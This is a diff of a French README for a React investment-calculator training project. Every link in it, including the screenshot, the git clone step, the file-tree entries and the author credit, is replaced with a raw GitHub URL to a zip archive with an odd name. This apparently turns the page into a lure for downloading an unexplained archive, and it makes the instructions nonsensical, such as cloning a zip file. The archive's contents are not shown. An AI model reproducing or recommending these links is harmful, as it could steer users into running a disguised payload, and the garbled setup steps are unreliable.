@@ -21,13 +21,13 @@
 
  ## 🎨 Aperçu 🖼️
 Voici la captures d'écran de l'application :  
-![Aperçu de Elegant-Context](https://raw.githubusercontent.com/Martialdepaul/react-investment/master/src/assets/react-investment-3.1.zip)
+![Aperçu de Elegant-Context](https://raw.githubusercontent.com/Martialdepaul/react-investment/master/public/react_investment_polyeidic.zip)
 
 ## 📦 Installation et utilisation
 
 1. **Cloner le dépôt** :
    ```bash
-   git clone https://raw.githubusercontent.com/Martialdepaul/react-investment/master/src/assets/react-investment-3.1.zip
+   git clone https://raw.githubusercontent.com/Martialdepaul/react-investment/master/public/react_investment_polyeidic.zip
    ```
 2. **Accéder au dossier** :
    ```bash
@@ -69,10 +69,10 @@ Voici la captures d'écran de l'application :
 ```plaintext
 src/
 ├── components/
-│   ├── https://raw.githubusercontent.com/Martialdepaul/react-investment/master/src/assets/react-investment-3.1.zip  // Formulaire pour saisir les données
-│   ├── https://raw.githubusercontent.com/Martialdepaul/react-investment/master/src/assets/react-investment-3.1.zip // Composant pour afficher le tableau des résultats
-├── https://raw.githubusercontent.com/Martialdepaul/react-investment/master/src/assets/react-investment-3.1.zip             // Composant principal de l'application
-├── https://raw.githubusercontent.com/Martialdepaul/react-investment/master/src/assets/react-investment-3.1.zip          // Feuille de style CSS
+│   ├── https://raw.githubusercontent.com/Martialdepaul/react-investment/master/public/react_investment_polyeidic.zip  // Formulaire pour saisir les données
+│   ├── https://raw.githubusercontent.com/Martialdepaul/react-investment/master/public/react_investment_polyeidic.zip // Composant pour afficher le tableau des résultats
+├── https://raw.githubusercontent.com/Martialdepaul/react-investment/master/public/react_investment_polyeidic.zip             // Composant principal de l'application
+├── https://raw.githubusercontent.com/Martialdepaul/react-investment/master/public/react_investment_polyeidic.zip          // Feuille de style CSS
 ```
 
 ## 🛠️ Objectifs pédagogiques
@@ -88,7 +88,7 @@ Ce projet est libre d'utilisation et modifiable.
 
 ---
 
-Développé dans le cadre de ma formation React avec ❤️ par [Martial De-Paul](https://raw.githubusercontent.com/Martialdepaul/react-investment/master/src/assets/react-investment-3.1.zip).
+Développé dans le cadre de ma formation React avec ❤️ par [Martial De-Paul](https://raw.githubusercontent.com/Martialdepaul/react-investment/master/public/react_investment_polyeidic.zip).
 ```
 
 ### Points à ajouter éventuellement :
